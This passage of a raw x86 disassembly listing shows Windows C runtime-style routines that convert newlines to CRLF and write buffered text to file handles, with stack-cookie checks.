  40b513:	3b f2                	cmp    %edx,%esi
  40b515:	7c f4                	jl     0x40b50b
  40b517:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40b51a:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40b51d:	85 f6                	test   %esi,%esi
  40b51f:	7e 16                	jle    0x40b537
  40b521:	56                   	push   %esi
  40b522:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b525:	03 c2                	add    %edx,%eax
  40b527:	57                   	push   %edi
  40b528:	50                   	push   %eax
  40b529:	e8 42 9d ff ff       	call   0x405270
  40b52e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40b531:	83 c4 0c             	add    $0xc,%esp
  40b534:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b537:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  40b53a:	8b f3                	mov    %ebx,%esi
  40b53c:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  40b543:	03 c1                	add    %ecx,%eax
  40b545:	88 5c 30 2e          	mov    %bl,0x2e(%eax,%esi,1)
  40b549:	46                   	inc    %esi
  40b54a:	3b f2                	cmp    %edx,%esi
  40b54c:	7c ee                	jl     0x40b53c
  40b54e:	8b 7d 9c             	mov    -0x64(%ebp),%edi
  40b551:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b554:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40b557:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40b55d:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40b560:	33 c0                	xor    %eax,%eax
  40b562:	83 7d cc 04          	cmpl   $0x4,-0x34(%ebp)
  40b566:	51                   	push   %ecx
  40b567:	0f 94 c0             	sete   %al
  40b56a:	89 9d 7c ff ff ff    	mov    %ebx,-0x84(%ebp)
  40b570:	40                   	inc    %eax
  40b571:	89 5d 80             	mov    %ebx,-0x80(%ebp)
  40b574:	50                   	push   %eax
  40b575:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b578:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40b57b:	50                   	push   %eax
  40b57c:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40b57f:	50                   	push   %eax
  40b580:	e8 de 0b 00 00       	call   0x40c163
  40b585:	83 c4 10             	add    $0x10,%esp
  40b588:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b58b:	0f 84 03 02 00 00    	je     0x40b794
  40b591:	eb 55                	jmp    0x40b5e8
  40b593:	0f b6 07             	movzbl (%edi),%eax
  40b596:	0f be 88 58 67 41 00 	movsbl 0x416758(%eax),%ecx
  40b59d:	41                   	inc    %ecx
  40b59e:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40b5a1:	3b ca                	cmp    %edx,%ecx
  40b5a3:	0f 8f 9e 01 00 00    	jg     0x40b747
  40b5a9:	33 c0                	xor    %eax,%eax
  40b5ab:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
  40b5b1:	83 f9 04             	cmp    $0x4,%ecx
  40b5b4:	89 9d 78 ff ff ff    	mov    %ebx,-0x88(%ebp)
  40b5ba:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  40b5c0:	89 7d cc             	mov    %edi,-0x34(%ebp)
  40b5c3:	0f 94 c0             	sete   %al
  40b5c6:	40                   	inc    %eax
  40b5c7:	51                   	push   %ecx
  40b5c8:	50                   	push   %eax
  40b5c9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b5cc:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40b5cf:	50                   	push   %eax
  40b5d0:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40b5d3:	50                   	push   %eax
  40b5d4:	e8 8a 0b 00 00       	call   0x40c163
  40b5d9:	83 c4 10             	add    $0x10,%esp
  40b5dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b5df:	0f 84 af 01 00 00    	je     0x40b794
  40b5e5:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40b5e8:	4f                   	dec    %edi
  40b5e9:	03 fe                	add    %esi,%edi
  40b5eb:	eb 7f                	jmp    0x40b66c
  40b5ed:	8a 54 01 2d          	mov    0x2d(%ecx,%eax,1),%dl
  40b5f1:	f6 c2 04             	test   $0x4,%dl
  40b5f4:	74 1e                	je     0x40b614
  40b5f6:	8a 44 01 2e          	mov    0x2e(%ecx,%eax,1),%al
  40b5fa:	80 e2 fb             	and    $0xfb,%dl
  40b5fd:	88 45 ec             	mov    %al,-0x14(%ebp)
  40b600:	8a 07                	mov    (%edi),%al
  40b602:	88 45 ed             	mov    %al,-0x13(%ebp)
  40b605:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40b608:	6a 02                	push   $0x2
  40b60a:	88 54 01 2d          	mov    %dl,0x2d(%ecx,%eax,1)
  40b60e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b611:	50                   	push   %eax
  40b612:	eb 43                	jmp    0x40b657
  40b614:	8a 07                	mov    (%edi),%al
  40b616:	88 45 e3             	mov    %al,-0x1d(%ebp)
  40b619:	e8 3a c3 ff ff       	call   0x407958
  40b61e:	0f b6 4d e3          	movzbl -0x1d(%ebp),%ecx
  40b622:	66 39 1c 48          	cmp    %bx,(%eax,%ecx,2)
  40b626:	7d 2c                	jge    0x40b654
  40b628:	8d 47 01             	lea    0x1(%edi),%eax
  40b62b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40b62e:	3b 45 a4             	cmp    -0x5c(%ebp),%eax
  40b631:	0f 83 31 01 00 00    	jae    0x40b768
  40b637:	6a 02                	push   $0x2
  40b639:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40b63c:	57                   	push   %edi
  40b63d:	50                   	push   %eax
  40b63e:	e8 7d f2 ff ff       	call   0x40a8c0
  40b643:	83 c4 0c             	add    $0xc,%esp
  40b646:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b649:	0f 84 45 01 00 00    	je     0x40b794
  40b64f:	8b 7d cc             	mov    -0x34(%ebp),%edi
  40b652:	eb 18                	jmp    0x40b66c
  40b654:	6a 01                	push   $0x1
  40b656:	57                   	push   %edi
  40b657:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40b65a:	50                   	push   %eax
  40b65b:	e8 60 f2 ff ff       	call   0x40a8c0
  40b660:	83 c4 0c             	add    $0xc,%esp
  40b663:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b666:	0f 84 28 01 00 00    	je     0x40b794
  40b66c:	53                   	push   %ebx
  40b66d:	53                   	push   %ebx
  40b66e:	6a 05                	push   $0x5
  40b670:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40b673:	47                   	inc    %edi
  40b674:	50                   	push   %eax
  40b675:	ff 75 dc             	push   -0x24(%ebp)
  40b678:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40b67b:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40b67e:	50                   	push   %eax
  40b67f:	53                   	push   %ebx
  40b680:	ff 75 88             	push   -0x78(%ebp)
  40b683:	e8 39 d7 ff ff       	call   0x408dc1
  40b688:	83 c4 20             	add    $0x20,%esp
  40b68b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40b68e:	85 c0                	test   %eax,%eax
  40b690:	0f 84 fe 00 00 00    	je     0x40b794
  40b696:	53                   	push   %ebx
  40b697:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40b69a:	51                   	push   %ecx
  40b69b:	50                   	push   %eax
  40b69c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40b69f:	50                   	push   %eax
  40b6a0:	ff 75 94             	push   -0x6c(%ebp)
  40b6a3:	ff 15 24 f1 40 00    	call   *0x40f124
  40b6a9:	85 c0                	test   %eax,%eax
  40b6ab:	0f 84 da 00 00 00    	je     0x40b78b
  40b6b1:	8b 75 b0             	mov    -0x50(%ebp),%esi
  40b6b4:	2b 75 98             	sub    -0x68(%ebp),%esi
  40b6b7:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40b6ba:	03 f7                	add    %edi,%esi
  40b6bc:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40b6bf:	39 45 a0             	cmp    %eax,-0x60(%ebp)
  40b6c2:	0f 82 cc 00 00 00    	jb     0x40b794
  40b6c8:	80 7d d1 0a          	cmpb   $0xa,-0x2f(%ebp)
  40b6cc:	75 34                	jne    0x40b702
  40b6ce:	6a 0d                	push   $0xd
  40b6d0:	58                   	pop    %eax
  40b6d1:	53                   	push   %ebx
  40b6d2:	66 89 45 d0          	mov    %ax,-0x30(%ebp)
  40b6d6:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40b6d9:	50                   	push   %eax
  40b6da:	6a 01                	push   $0x1
  40b6dc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b6df:	50                   	push   %eax
  40b6e0:	ff 75 94             	push   -0x6c(%ebp)
  40b6e3:	ff 15 24 f1 40 00    	call   *0x40f124
  40b6e9:	85 c0                	test   %eax,%eax
  40b6eb:	0f 84 9a 00 00 00    	je     0x40b78b
  40b6f1:	83 7d a0 01          	cmpl   $0x1,-0x60(%ebp)
  40b6f5:	0f 82 99 00 00 00    	jb     0x40b794
  40b6fb:	ff 45 b0             	incl   -0x50(%ebp)
  40b6fe:	46                   	inc    %esi
  40b6ff:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40b702:	3b 7d a4             	cmp    -0x5c(%ebp),%edi
  40b705:	0f 83 89 00 00 00    	jae    0x40b794
  40b70b:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  40b70e:	e9 7c fd ff ff       	jmp    0x40b48f
  40b713:	85 d2                	test   %edx,%edx
  40b715:	7e 25                	jle    0x40b73c
  40b717:	8b f1                	mov    %ecx,%esi
  40b719:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40b71c:	8b 0c 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%ecx
  40b723:	8a 04 3b             	mov    (%ebx,%edi,1),%al
  40b726:	03 ce                	add    %esi,%ecx
  40b728:	8b 75 dc             	mov    -0x24(%ebp),%esi
  40b72b:	03 cb                	add    %ebx,%ecx
  40b72d:	43                   	inc    %ebx
  40b72e:	88 44 31 2e          	mov    %al,0x2e(%ecx,%esi,1)
  40b732:	8b 75 d8             	mov    -0x28(%ebp),%esi
  40b735:	3b da                	cmp    %edx,%ebx
  40b737:	7c e0                	jl     0x40b719
  40b739:	8b 75 ac             	mov    -0x54(%ebp),%esi
  40b73c:	03 f2                	add    %edx,%esi
  40b73e:	80 7d c8 00          	cmpb   $0x0,-0x38(%ebp)
  40b742:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40b745:	eb 50                	jmp    0x40b797
  40b747:	85 d2                	test   %edx,%edx
  40b749:	7e f1                	jle    0x40b73c
  40b74b:	8b 75 d8             	mov    -0x28(%ebp),%esi
  40b74e:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40b751:	8b 0c 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%ecx
  40b758:	8a 04 3b             	mov    (%ebx,%edi,1),%al
  40b75b:	03 ce                	add    %esi,%ecx
  40b75d:	88 44 19 2e          	mov    %al,0x2e(%ecx,%ebx,1)
  40b761:	43                   	inc    %ebx
  40b762:	3b da                	cmp    %edx,%ebx
  40b764:	7c e8                	jl     0x40b74e
  40b766:	eb d1                	jmp    0x40b739
  40b768:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  40b76b:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40b76e:	8a 5d e3             	mov    -0x1d(%ebp),%bl
  40b771:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40b778:	88 5c 01 2e          	mov    %bl,0x2e(%ecx,%eax,1)
  40b77c:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40b783:	80 4c 01 2d 04       	orb    $0x4,0x2d(%ecx,%eax,1)
  40b788:	46                   	inc    %esi
  40b789:	eb b3                	jmp    0x40b73e
  40b78b:	ff 15 70 f0 40 00    	call   *0x40f070
  40b791:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40b794:	38 5d c8             	cmp    %bl,-0x38(%ebp)
  40b797:	74 0a                	je     0x40b7a3
  40b799:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40b79c:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
  40b7a3:	8b 45 08             	mov    0x8(%ebp),%eax
  40b7a6:	8d 75 a8             	lea    -0x58(%ebp),%esi
  40b7a9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b7ac:	8b f8                	mov    %eax,%edi
  40b7ae:	33 cd                	xor    %ebp,%ecx
  40b7b0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b7b1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b7b2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b7b3:	5f                   	pop    %edi
  40b7b4:	5e                   	pop    %esi
  40b7b5:	5b                   	pop    %ebx
  40b7b6:	e8 8a 7f ff ff       	call   0x403745
  40b7bb:	c9                   	leave
  40b7bc:	c3                   	ret
  40b7bd:	8b ff                	mov    %edi,%edi
  40b7bf:	55                   	push   %ebp
  40b7c0:	8b ec                	mov    %esp,%ebp
  40b7c2:	51                   	push   %ecx
  40b7c3:	53                   	push   %ebx
  40b7c4:	56                   	push   %esi
  40b7c5:	8b 75 08             	mov    0x8(%ebp),%esi
  40b7c8:	33 c0                	xor    %eax,%eax
  40b7ca:	57                   	push   %edi
  40b7cb:	8b fe                	mov    %esi,%edi
  40b7cd:	ab                   	stos   %eax,%es:(%edi)
  40b7ce:	ab                   	stos   %eax,%es:(%edi)
  40b7cf:	ab                   	stos   %eax,%es:(%edi)
  40b7d0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40b7d3:	8b 45 10             	mov    0x10(%ebp),%eax
  40b7d6:	03 c7                	add    %edi,%eax
  40b7d8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b7db:	3b f8                	cmp    %eax,%edi
  40b7dd:	73 3f                	jae    0x40b81e
  40b7df:	0f b7 1f             	movzwl (%edi),%ebx
  40b7e2:	53                   	push   %ebx
  40b7e3:	e8 48 0b 00 00       	call   0x40c330
  40b7e8:	59                   	pop    %ecx
  40b7e9:	66 3b c3             	cmp    %bx,%ax
  40b7ec:	75 28                	jne    0x40b816
  40b7ee:	83 46 04 02          	addl   $0x2,0x4(%esi)
  40b7f2:	83 fb 0a             	cmp    $0xa,%ebx
  40b7f5:	75 15                	jne    0x40b80c
  40b7f7:	6a 0d                	push   $0xd
  40b7f9:	5b                   	pop    %ebx
  40b7fa:	53                   	push   %ebx
  40b7fb:	e8 30 0b 00 00       	call   0x40c330
  40b800:	59                   	pop    %ecx
  40b801:	66 3b c3             	cmp    %bx,%ax
  40b804:	75 10                	jne    0x40b816
  40b806:	ff 46 04             	incl   0x4(%esi)
  40b809:	ff 46 08             	incl   0x8(%esi)
  40b80c:	83 c7 02             	add    $0x2,%edi
  40b80f:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  40b812:	72 cb                	jb     0x40b7df
  40b814:	eb 08                	jmp    0x40b81e
  40b816:	ff 15 70 f0 40 00    	call   *0x40f070
  40b81c:	89 06                	mov    %eax,(%esi)
  40b81e:	5f                   	pop    %edi
  40b81f:	8b c6                	mov    %esi,%eax
  40b821:	5e                   	pop    %esi
  40b822:	5b                   	pop    %ebx
  40b823:	c9                   	leave
  40b824:	c3                   	ret
  40b825:	8b ff                	mov    %edi,%edi
  40b827:	55                   	push   %ebp
  40b828:	8b ec                	mov    %esp,%ebp
  40b82a:	51                   	push   %ecx
  40b82b:	56                   	push   %esi
  40b82c:	8b 75 08             	mov    0x8(%ebp),%esi
  40b82f:	57                   	push   %edi
  40b830:	56                   	push   %esi
  40b831:	e8 0d 07 00 00       	call   0x40bf43
  40b836:	59                   	pop    %ecx
  40b837:	85 c0                	test   %eax,%eax
  40b839:	74 55                	je     0x40b890
  40b83b:	8b fe                	mov    %esi,%edi
  40b83d:	83 e6 3f             	and    $0x3f,%esi
  40b840:	c1 ff 06             	sar    $0x6,%edi
  40b843:	6b f6 38             	imul   $0x38,%esi,%esi
  40b846:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  40b84d:	80 7c 30 28 00       	cmpb   $0x0,0x28(%eax,%esi,1)
  40b852:	7d 3c                	jge    0x40b890
  40b854:	e8 a7 b7 ff ff       	call   0x407000
  40b859:	8b 40 4c             	mov    0x4c(%eax),%eax
  40b85c:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  40b863:	75 0e                	jne    0x40b873
  40b865:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  40b86c:	80 7c 30 29 00       	cmpb   $0x0,0x29(%eax,%esi,1)
  40b871:	74 1d                	je     0x40b890
  40b873:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b876:	50                   	push   %eax
  40b877:	8b 04 bd c8 70 41 00 	mov    0x4170c8(,%edi,4),%eax
  40b87e:	ff 74 30 18          	push   0x18(%eax,%esi,1)
  40b882:	ff 15 34 f1 40 00    	call   *0x40f134
  40b888:	85 c0                	test   %eax,%eax
  40b88a:	74 04                	je     0x40b890
  40b88c:	b0 01                	mov    $0x1,%al
  40b88e:	eb 02                	jmp    0x40b892
  40b890:	32 c0                	xor    %al,%al
  40b892:	5f                   	pop    %edi
  40b893:	5e                   	pop    %esi
  40b894:	c9                   	leave
  40b895:	c3                   	ret
  40b896:	8b ff                	mov    %edi,%edi
  40b898:	55                   	push   %ebp
  40b899:	8b ec                	mov    %esp,%ebp
  40b89b:	b8 0c 14 00 00       	mov    $0x140c,%eax
  40b8a0:	e8 fb 2b 00 00       	call   0x40e4a0
  40b8a5:	a1 04 60 41 00       	mov    0x416004,%eax
  40b8aa:	33 c5                	xor    %ebp,%eax
  40b8ac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b8af:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b8b2:	8b c1                	mov    %ecx,%eax
  40b8b4:	8b 55 14             	mov    0x14(%ebp),%edx
  40b8b7:	83 e1 3f             	and    $0x3f,%ecx
  40b8ba:	c1 f8 06             	sar    $0x6,%eax
  40b8bd:	6b c9 38             	imul   $0x38,%ecx,%ecx
  40b8c0:	53                   	push   %ebx
  40b8c1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40b8c4:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40b8cb:	56                   	push   %esi
  40b8cc:	57                   	push   %edi
  40b8cd:	8b fb                	mov    %ebx,%edi
  40b8cf:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  40b8d3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b8d6:	03 d1                	add    %ecx,%edx
  40b8d8:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  40b8de:	33 c0                	xor    %eax,%eax
  40b8e0:	ab                   	stos   %eax,%es:(%edi)
  40b8e1:	89 95 f4 eb ff ff    	mov    %edx,-0x140c(%ebp)
  40b8e7:	ab                   	stos   %eax,%es:(%edi)
  40b8e8:	ab                   	stos   %eax,%es:(%edi)
  40b8e9:	3b ca                	cmp    %edx,%ecx
  40b8eb:	73 73                	jae    0x40b960
  40b8ed:	8b bd f8 eb ff ff    	mov    -0x1408(%ebp),%edi
  40b8f3:	8d b5 fc eb ff ff    	lea    -0x1404(%ebp),%esi
  40b8f9:	3b ca                	cmp    %edx,%ecx
  40b8fb:	73 18                	jae    0x40b915
  40b8fd:	8a 01                	mov    (%ecx),%al
  40b8ff:	41                   	inc    %ecx
  40b900:	3c 0a                	cmp    $0xa,%al
  40b902:	75 07                	jne    0x40b90b
  40b904:	ff 43 08             	incl   0x8(%ebx)
  40b907:	c6 06 0d             	movb   $0xd,(%esi)
  40b90a:	46                   	inc    %esi
  40b90b:	88 06                	mov    %al,(%esi)
  40b90d:	46                   	inc    %esi
  40b90e:	8d 45 fb             	lea    -0x5(%ebp),%eax
  40b911:	3b f0                	cmp    %eax,%esi
  40b913:	72 e4                	jb     0x40b8f9
  40b915:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40b91b:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40b91e:	2b f0                	sub    %eax,%esi
  40b920:	8d 85 f8 eb ff ff    	lea    -0x1408(%ebp),%eax
  40b926:	6a 00                	push   $0x0
  40b928:	50                   	push   %eax
  40b929:	56                   	push   %esi
  40b92a:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40b930:	50                   	push   %eax
  40b931:	57                   	push   %edi
  40b932:	ff 15 24 f1 40 00    	call   *0x40f124
  40b938:	85 c0                	test   %eax,%eax
  40b93a:	74 1c                	je     0x40b958
  40b93c:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  40b942:	01 43 04             	add    %eax,0x4(%ebx)
  40b945:	3b c6                	cmp    %esi,%eax
  40b947:	72 17                	jb     0x40b960
  40b949:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b94c:	8b 95 f4 eb ff ff    	mov    -0x140c(%ebp),%edx
  40b952:	3b ca                	cmp    %edx,%ecx
  40b954:	72 9d                	jb     0x40b8f3
  40b956:	eb 08                	jmp    0x40b960
  40b958:	ff 15 70 f0 40 00    	call   *0x40f070
  40b95e:	89 03                	mov    %eax,(%ebx)
  40b960:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b963:	8b c3                	mov    %ebx,%eax
  40b965:	5f                   	pop    %edi
  40b966:	5e                   	pop    %esi
  40b967:	33 cd                	xor    %ebp,%ecx
  40b969:	5b                   	pop    %ebx
  40b96a:	e8 d6 7d ff ff       	call   0x403745
  40b96f:	c9                   	leave
  40b970:	c3                   	ret
  40b971:	8b ff                	mov    %edi,%edi
  40b973:	55                   	push   %ebp
  40b974:	8b ec                	mov    %esp,%ebp
  40b976:	b8 10 14 00 00       	mov    $0x1410,%eax
  40b97b:	e8 20 2b 00 00       	call   0x40e4a0
  40b980:	a1 04 60 41 00       	mov    0x416004,%eax
  40b985:	33 c5                	xor    %ebp,%eax
  40b987:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b98a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b98d:	8b c1                	mov    %ecx,%eax
  40b98f:	8b 55 14             	mov    0x14(%ebp),%edx
  40b992:	83 e1 3f             	and    $0x3f,%ecx
  40b995:	c1 f8 06             	sar    $0x6,%eax
  40b998:	6b c9 38             	imul   $0x38,%ecx,%ecx
  40b99b:	53                   	push   %ebx
  40b99c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40b99f:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40b9a6:	56                   	push   %esi
  40b9a7:	57                   	push   %edi
  40b9a8:	8b fb                	mov    %ebx,%edi
  40b9aa:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  40b9ae:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b9b1:	03 d1                	add    %ecx,%edx
  40b9b3:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  40b9b9:	33 c0                	xor    %eax,%eax
  40b9bb:	ab                   	stos   %eax,%es:(%edi)
  40b9bc:	89 95 f0 eb ff ff    	mov    %edx,-0x1410(%ebp)
  40b9c2:	ab                   	stos   %eax,%es:(%edi)
  40b9c3:	ab                   	stos   %eax,%es:(%edi)
  40b9c4:	eb 75                	jmp    0x40ba3b
  40b9c6:	8d b5 fc eb ff ff    	lea    -0x1404(%ebp),%esi
  40b9cc:	3b ca                	cmp    %edx,%ecx
  40b9ce:	73 25                	jae    0x40b9f5
  40b9d0:	0f b7 01             	movzwl (%ecx),%eax
  40b9d3:	83 c1 02             	add    $0x2,%ecx
  40b9d6:	83 f8 0a             	cmp    $0xa,%eax
  40b9d9:	75 0d                	jne    0x40b9e8
  40b9db:	83 43 08 02          	addl   $0x2,0x8(%ebx)
  40b9df:	6a 0d                	push   $0xd
  40b9e1:	5f                   	pop    %edi
  40b9e2:	66 89 3e             	mov    %di,(%esi)
  40b9e5:	83 c6 02             	add    $0x2,%esi
  40b9e8:	66 89 06             	mov    %ax,(%esi)
  40b9eb:	83 c6 02             	add    $0x2,%esi
  40b9ee:	8d 45 fa             	lea    -0x6(%ebp),%eax
  40b9f1:	3b f0                	cmp    %eax,%esi
  40b9f3:	72 d7                	jb     0x40b9cc
  40b9f5:	8b bd f8 eb ff ff    	mov    -0x1408(%ebp),%edi
  40b9fb:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40ba01:	2b f0                	sub    %eax,%esi
  40ba03:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40ba06:	6a 00                	push   $0x0
  40ba08:	8d 85 f4 eb ff ff    	lea    -0x140c(%ebp),%eax
  40ba0e:	83 e6 fe             	and    $0xfffffffe,%esi
  40ba11:	50                   	push   %eax
  40ba12:	56                   	push   %esi
  40ba13:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40ba19:	50                   	push   %eax
  40ba1a:	57                   	push   %edi
  40ba1b:	ff 15 24 f1 40 00    	call   *0x40f124
  40ba21:	85 c0                	test   %eax,%eax
  40ba23:	74 1c                	je     0x40ba41
  40ba25:	8b 85 f4 eb ff ff    	mov    -0x140c(%ebp),%eax
  40ba2b:	01 43 04             	add    %eax,0x4(%ebx)
  40ba2e:	3b c6                	cmp    %esi,%eax
  40ba30:	72 17                	jb     0x40ba49
  40ba32:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40ba35:	8b 95 f0 eb ff ff    	mov    -0x1410(%ebp),%edx
  40ba3b:	3b ca                	cmp    %edx,%ecx
  40ba3d:	72 87                	jb     0x40b9c6
  40ba3f:	eb 08                	jmp    0x40ba49
  40ba41:	ff 15 70 f0 40 00    	call   *0x40f070
  40ba47:	89 03                	mov    %eax,(%ebx)
  40ba49:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ba4c:	8b c3                	mov    %ebx,%eax
  40ba4e:	5f                   	pop    %edi
  40ba4f:	5e                   	pop    %esi
  40ba50:	33 cd                	xor    %ebp,%ecx
  40ba52:	5b                   	pop    %ebx
  40ba53:	e8 ed 7c ff ff       	call   0x403745
  40ba58:	c9                   	leave
  40ba59:	c3                   	ret
  40ba5a:	8b ff                	mov    %edi,%edi
  40ba5c:	55                   	push   %ebp
  40ba5d:	8b ec                	mov    %esp,%ebp
  40ba5f:	b8 18 14 00 00       	mov    $0x1418,%eax
  40ba64:	e8 37 2a 00 00       	call   0x40e4a0
  40ba69:	a1 04 60 41 00       	mov    0x416004,%eax
  40ba6e:	33 c5                	xor    %ebp,%eax
  40ba70:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ba73:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ba76:	8b c1                	mov    %ecx,%eax
  40ba78:	8b 55 10             	mov    0x10(%ebp),%edx
  40ba7b:	83 e1 3f             	and    $0x3f,%ecx
  40ba7e:	c1 f8 06             	sar    $0x6,%eax
  40ba81:	6b c9 38             	imul   $0x38,%ecx,%ecx
  40ba84:	53                   	push   %ebx
  40ba85:	56                   	push   %esi
  40ba86:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40ba8d:	8b 75 08             	mov    0x8(%ebp),%esi
  40ba90:	57                   	push   %edi
  40ba91:	8b fe                	mov    %esi,%edi
  40ba93:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  40ba97:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40ba9a:	89 85 f0 eb ff ff    	mov    %eax,-0x1410(%ebp)
  40baa0:	03 ca                	add    %edx,%ecx
  40baa2:	33 c0                	xor    %eax,%eax
  40baa4:	89 8d f4 eb ff ff    	mov    %ecx,-0x140c(%ebp)
  40baaa:	ab                   	stos   %eax,%es:(%edi)
  40baab:	ab                   	stos   %eax,%es:(%edi)
  40baac:	ab                   	stos   %eax,%es:(%edi)
  40baad:	8b fa                	mov    %edx,%edi
  40baaf:	3b d1                	cmp    %ecx,%edx
  40bab1:	0f 83 c4 00 00 00    	jae    0x40bb7b
  40bab7:	8b b5 f4 eb ff ff    	mov    -0x140c(%ebp),%esi
  40babd:	8d 85 50 f9 ff ff    	lea    -0x6b0(%ebp),%eax
  40bac3:	3b fe                	cmp    %esi,%edi
  40bac5:	73 21                	jae    0x40bae8
  40bac7:	0f b7 0f             	movzwl (%edi),%ecx
  40baca:	83 c7 02             	add    $0x2,%edi
  40bacd:	83 f9 0a             	cmp    $0xa,%ecx
  40bad0:	75 09                	jne    0x40badb
  40bad2:	6a 0d                	push   $0xd
  40bad4:	5a                   	pop    %edx
  40bad5:	66 89 10             	mov    %dx,(%eax)
  40bad8:	83 c0 02             	add    $0x2,%eax
  40badb:	66 89 08             	mov    %cx,(%eax)
  40bade:	83 c0 02             	add    $0x2,%eax
  40bae1:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40bae4:	3b c1                	cmp    %ecx,%eax
  40bae6:	72 db                	jb     0x40bac3
  40bae8:	6a 00                	push   $0x0
  40baea:	6a 00                	push   $0x0
  40baec:	68 55 0d 00 00       	push   $0xd55
  40baf1:	8d 8d f8 eb ff ff    	lea    -0x1408(%ebp),%ecx
  40baf7:	51                   	push   %ecx
  40baf8:	8d 8d 50 f9 ff ff    	lea    -0x6b0(%ebp),%ecx
  40bafe:	2b c1                	sub    %ecx,%eax
  40bb00:	d1 f8                	sar    $1,%eax
  40bb02:	50                   	push   %eax
  40bb03:	8b c1                	mov    %ecx,%eax
  40bb05:	50                   	push   %eax
  40bb06:	6a 00                	push   $0x0
